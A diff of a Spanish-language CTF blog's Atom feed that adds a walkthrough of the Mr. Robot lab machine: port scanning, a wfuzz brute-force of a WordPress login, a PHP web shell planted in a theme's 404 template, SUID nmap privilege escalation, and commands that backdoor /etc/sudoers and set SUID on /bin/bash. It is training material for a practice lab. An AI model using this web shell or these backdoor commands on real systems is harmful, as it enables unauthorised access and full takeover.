@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-20T10:42:38-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>Htb Injection</title><link href="http://localhost:4000/HTB-Injection/" rel="alternate" type="text/html" title="Htb Injection" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Injection</id><content type="html" xml:base="http://localhost:4000/HTB-Injection/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-21T13:45:45-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>Htb Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="Htb Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;en-esta-maquina-veremos&quot;&gt;En esta maquina veremos:&lt;/h2&gt;
 &lt;ul&gt;
@@ -13,7 +13,7 @@
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;Ip de la Maquina&amp;gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; &amp;lt;Nombre del archivo que contendra la informacion&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Aunque tambien podemos usar tambien:&lt;/p&gt;
+&lt;p&gt;Aunque tambien podemos usar:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP Maquina&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;A estos puertos le pasaremos un scan de &lt;strong&gt;reconocimiento&lt;/strong&gt;, pero esta vez del servicio y versiones que corren tras la pagina.&lt;/p&gt;
@@ -118,6 +118,8 @@ Como podemos ver, una vez que se ejecuta el permiso del binario cambia a &lt;str
   &lt;li&gt;Escalada de privilegios usando SUDOERS&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;
+
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP-De la maquina&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;O si quieres ir a lo loco:&lt;/p&gt;
@@ -126,14 +128,137 @@ Como podemos ver, una vez que se ejecuta el permiso del binario cambia a &lt;str
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;El caso, veremos puertos interesantes:&lt;/p&gt;
 
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
 &lt;ul&gt;
   &lt;li&gt;22 - SSH&lt;/li&gt;
   &lt;li&gt;80 - Http&lt;/li&gt;
   &lt;li&gt;443 - Https&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;p&gt;Ahora lo que haremos sera ver los servicios y las versiones usadas tras los puertos, usando el comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,443 &amp;lt;IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, tanto el puerto &lt;strong&gt;80,443&lt;/strong&gt; nos llevan a una pagina web:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
 &lt;p&gt;Para optimizar el proceso de enumeracion de directorios, tiraremos de un &lt;strong&gt;Script&lt;/strong&gt;, propio de la herramienta nmap.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http-enum'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &amp;lt;IP De la Maquina&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><summary>Comentario:
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &amp;lt;IP De la Maquina&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos ver directorios interesantes, como:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;/robots.txt&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/wp-login.php&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si vamos a la ruta robots veremos cosas interesantes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr6.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/Mr.Robot/Mr5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos descargamos lo que parece ser un diccionario, el archivo &lt;strong&gt;fsocity.dic&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Y si lo analizamos, podremos ver que es un diccionario “extenso”:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr7.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/Mr.Robot/Mr8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero si filtramos por el comando “sort”, para ordenar si es que existen cadenas de texto iguales, podremos ver passwords repetidas, asi que eliminaremos eso y nos quedaremos solo con las &lt;strong&gt;unicas&lt;/strong&gt; y lo almacenaremos en un nuevo diccionario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;intrusion&quot;&gt;Intrusion&lt;/h2&gt;
+
+&lt;p&gt;Ahora nos quedaria tirar de un ataque de fuerza bruta contra el directorio de login que descrubrimos anteriormente, “&lt;strong&gt;/wp-login.php&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;p&gt;Si tratamos de testear al usuario, veremos que “&lt;strong&gt;admin&lt;/strong&gt;”” no es un usuario existente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero si hemos visto la serie, uno de los personajes principales tiene de nombre &lt;strong&gt;“Elliot Alderson”&lt;/strong&gt;, asi que veamos si existe el usuario “&lt;strong&gt;elliot&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, el usuario es existente, por lo que trataremos de aplicarle &lt;strong&gt;fuerza bruta&lt;/strong&gt; al campo de la password.
+Usando la herramienta &lt;strong&gt;burpsuite&lt;/strong&gt;, interceptaremos la peticion para obtener informacion importante:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos ver cositas:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;La  cabecera lleva una “Cookie”&lt;/li&gt;
+  &lt;li&gt;El campo que queremos bruteforcear se fija en &lt;strong&gt;log=elliot&amp;amp;pwd=Password&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Yo use la herramienta &lt;strong&gt;wfuzz&lt;/strong&gt; para aplicar el ataque, pero puedes usar tranquilamente burpsuite pasandole el diccionario.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El comando utilizado fue:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &amp;lt;URL De la Maquina&amp;gt;/wp-login.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cookie: &amp;lt;Cabecera que sacamos del burpsuite&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;log=elliot&amp;amp;pwd=FUZZ&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;Ruta del diccionario que creamos&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Podemos ver que todas nos devuelven un estado 200, y una cantidad de respuesta igual a 3727, menos una password, &lt;strong&gt;“ER28-0652”&lt;/strong&gt;, esta nos devuelve un codigo &lt;strong&gt;302 - FOUND&lt;/strong&gt;. Por lo que esa es nuestra password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, entramos como el usuario Elliot, ahora nos toca buscar dentro de la interfaz algo que nos permita meternos de lleno dentro del servidor.&lt;/p&gt;
+
+&lt;p&gt;Si nos dirigimos a “Appeareance”, podemos ver el codigo que se emplea para cuando se da un &lt;strong&gt;“404 Not Found”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr15.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/Mr.Robot/Mr16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asi que como tenemos opcion de modificar la funcion, le introducimos un codigo php malicioso:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos permite ejecutar codigo directamente en el sistema, usando php como interprete.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que nos queda introducir nuestra reverse shell y ganar acceso a la maquina:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces, nos queda buscar si existen binarios con permisos &lt;strong&gt;SUID&lt;/strong&gt; o similares:&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-privesc&quot;&gt;Escalada de Privilegios (PRIVESC)&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos ver que tenemos un binario de &lt;strong&gt;nmap&lt;/strong&gt;, pero si vemos la version, vamos a toparnos con que es muy desactualizada, asi que vamos a nuestra pagina de confianza &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBINS&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos el comando binario como nos lo indica, y podemos ejecutar comandos como root:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/MrRobot21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En este caso, podemos explotar el fichero de &lt;strong&gt;/etc/sudoers&lt;/strong&gt;, para no introducir password, o podemos darle permisos de super usuario al binario de &lt;strong&gt;/bin/bash&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;Para el sudoers:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ALL ALL=(ALL) NOPASSWD: ALL&quot;&lt;/span&gt; | tee &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/sudoers
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Para el binario de &lt;strong&gt;bash&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod u+s /bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Para finalizar, si estas en &lt;strong&gt;TryHackMe&lt;/strong&gt;, aqui te doy la forma rapida de tener las llaves:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Mr.Robot/Mr22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="VulnHub" /><summary>Comentario:
 Esta fue de las primeras maquinas que hice, inspirada en la serie “Mr.Robot”. Tiene una forma muy entretenida de resolver, comenzamos:</summary></entry></feed>
